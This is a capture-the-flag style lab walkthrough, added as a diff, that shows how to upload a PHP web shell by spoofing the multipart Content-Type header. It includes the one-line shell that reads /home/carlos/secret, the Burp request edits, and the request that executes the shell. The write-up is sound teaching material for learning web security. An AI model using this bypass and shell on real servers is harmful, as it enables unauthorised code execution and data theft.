@@ -1,0 +1,172 @@
+# Web Shell Upload via Content-Type Restriction Bypass
+
+## Objective
+
+The application has an image upload feature that attempts to prevent users from uploading unexpected file types.
+
+The goal is to bypass the upload restriction, upload a PHP web shell, and use it to read the contents of:
+
+/home/carlos/secret
+
+Login credentials:
+
+Username: wiener
+Password: peter
+
+
+## Solution
+
+### Step 1 — Login
+
+Login to the application using:
+
+Username: wiener
+Password: peter
+
+After logging in, go to the My Account page.
+
+
+### Step 2 — Upload an Image
+
+Upload a normal image as your avatar.
+
+Open Burp Suite and go to:
+
+Proxy > HTTP history
+
+Find the request used to retrieve your uploaded image.
+
+It will look similar to:
+
+GET /files/avatars/image.jpg HTTP/1.1
+
+Send this request to Burp Repeater.
+
+
+### Step 3 — Create the PHP Web Shell
+
+Create a file called:
+
+exploit.php
+
+Add the following code:
+
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+
+This PHP code reads the contents of /home/carlos/secret and prints it in the HTTP response.
+
+
+### Step 4 — Try to Upload the PHP File
+
+Try uploading exploit.php as your avatar.
+
+The application rejects the file because it only allows image MIME types such as:
+
+image/jpeg
+image/png
+
+This shows that the application is checking the Content-Type of the uploaded file.
+
+
+### Step 5 — Find the Upload Request
+
+Go back to:
+
+Proxy > HTTP history
+
+Find the upload request:
+
+POST /my-account/avatar
+
+Send the request to Burp Repeater.
+
+Inside the multipart request, find the part containing exploit.php.
+
+It should look similar to:
+
+Content-Disposition: form-data; name="avatar"; filename="exploit.php"
+Content-Type: application/x-php
+
+
+### Step 6 — Bypass the Content-Type Restriction
+
+Change:
+
+Content-Type: application/x-php
+
+to:
+
+Content-Type: image/jpeg
+
+Keep the filename as:
+
+exploit.php
+
+The request should now contain:
+
+Content-Disposition: form-data; name="avatar"; filename="exploit.php"
+Content-Type: image/jpeg
+
+Send the request.
+
+The server accepts the file because it trusts the user-controlled Content-Type value.
+
+
+### Step 7 — Access the Uploaded Web Shell
+
+Switch to the Repeater tab containing the GET request for your uploaded image.
+
+Originally, it should look similar to:
+
+GET /files/avatars/image.jpg HTTP/1.1
+
+Change the filename to:
+
+exploit.php
+
+The request becomes:
+
+GET /files/avatars/exploit.php HTTP/1.1
+
+Send the request.
+
+The PHP file is executed by the server.
+
+The response contains the contents of:
+
+/home/carlos/secret
+
+
+### Step 8 — Submit the Secret
+
+Copy the secret returned in the response.
+
+Submit the secret using the button provided in the lab banner.
+
+The lab is now solved.
+
+
+## Vulnerability
+
+The application attempts to restrict uploaded files by checking their MIME type.
+
+However, the Content-Type value in the multipart upload request is controlled by the client.
+
+We changed:
+
+application/x-php
+
+to:
+
+image/jpeg
+
+while keeping the actual filename as:
+
+exploit.php
+
+This bypassed the Content-Type restriction and allowed the PHP web shell to be uploaded and executed.
+
+
+## Conclusion
+
+Congratulations!! you have solved this problem!!
